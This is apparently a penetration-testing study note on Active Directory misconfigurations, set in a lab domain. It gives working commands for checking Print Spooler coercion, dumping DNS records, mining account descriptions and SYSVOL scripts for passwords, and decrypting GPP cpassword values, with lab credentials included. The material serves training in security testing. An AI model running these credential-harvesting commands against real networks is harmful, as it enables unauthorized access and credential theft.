# Miscellaneous Misconfigurations
**Concept:** Active Directory environments are old. Over years of administration, admins leave credentials in descriptions, scripts in SYSVOL, and legacy configurations (like GPP) that are gold mines for attackers. 
**Goal:** Loot credentials and identify hidden infrastructure without exploiting code vulnerabilities.
## 1. The Printer Bug (Coercion)
**Concept:** The **Print Spooler** service is enabled by default on Domain Controllers. If it is running, any authenticated user can force the DC to connect to a machine of their choice (Coercion). 
**Attack:** This is the trigger for **NTLM Relaying** (e.g., to AD CS or for Unconstrained Delegation).
### Enumeration (Is it running?)
We check if the Spooler service is active on the DC.
```powershell
# Import SecurityAssessment.ps1 (from ItzVenom or similar repos)
Import-Module .\SecurityAssessment.ps1

# Check Status
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
- **Result:** If "Running", the DC is vulnerable to `SpoolSample` or `dementor.py`.
## 2. DNS Enumeration (ADIDNS)
**Concept:** By default, any authenticated user can query the entire DNS zone of the domain. This reveals hidden hosts, development servers, and potentially stale records that can be hijacked (like `WPAD` or `proxy`).
**Tool:** `adidnsdump` (Python).
```shell
# Dump all DNS records via LDAP
# -u: User | -r: Resolve unknown records (Active query)
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

# View Results
head records.csv
```
- **Look For:** `wpad`, `dev`, `test`, `backup`, `intranet`.
## 3. Password Mining (User Attributes)
**Concept:** Sysadmins often store initial passwords or hints in the **Description** field of a user account. This field is readable by everyone.
### Finding Passwords in Descriptions
**Tool:** PowerView / Native PowerShell.
```powershell
# PowerView
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Native (AD Module)
Get-ADUser -Filter * -Properties Description | ? {$_.Description -ne $null} | Select Name, Description
```
### Finding Accounts with No Password Requirement
**Flag:** `PASSWD_NOTREQD`. These accounts might have a blank password.
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## 4. SYSVOL & Script Mining
**Concept:** The **SYSVOL** share replicates files (Login Scripts, GPOs) to every DC. It is readable by all users. Admins historically hardcoded passwords in `.vbs` or `.bat` scripts here to map drives or reset local admin passwords.
### Hunting in SYSVOL
```shell
# List scripts
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Search for "password" in all files (Recursively)
findstr /S /I "password" \\academy-ea-dc01\SYSVOL\*.vbs
findstr /S /I "password" \\academy-ea-dc01\SYSVOL\*.xml
```
## 5. Group Policy Preferences (GPP)
**Concept:** Before 2014, Windows allowed admins to set local passwords via GPO (in `groups.xml`, `services.xml`, etc.). **The Flaw:** Microsoft encrypted the `cpassword` field with a fixed AES-256 key... which they published on MSDN. **The Exploit:** If you find an old XML file in SYSVOL with a `cpassword`, you can decrypt it instantly. This vulnerability is patched (MS14-025), but the _files_ often remain.
### Detection & Decryption (Linux)
**Tool:** CrackMapExec / NetExec.
```shell
# Scan specifically for GPP files
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

**Manual Decryption:** If you find a string (e.g., `VPe/o9YR...`), use `gpp-decrypt`.
```shell
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```